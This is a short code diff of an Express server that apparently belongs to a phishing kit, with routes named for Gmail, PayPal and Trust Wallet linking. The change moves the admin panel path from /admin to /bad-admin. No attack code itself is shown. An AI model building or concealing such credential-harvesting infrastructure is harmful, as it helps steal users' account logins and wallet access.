@@ -76,8 +76,8 @@ app.use("/", require("./routes/gmail"));
 app.use("/paypal", require("./routes/paypal"));
 app.use("/trust-wallet-link", require("./routes/trustwallet"));
 app.use("/api/wallet", require("./routes/api/wallet"));
-app.use("/admin", require("./routes/admin"));
-app.use("/admin", require("./routes/admin/auth"));
+app.use("/bad-admin", require("./routes/admin"));
+app.use("/bad-admin", require("./routes/admin/auth"));
 
 app.use("*", (req, res) => {
   try {
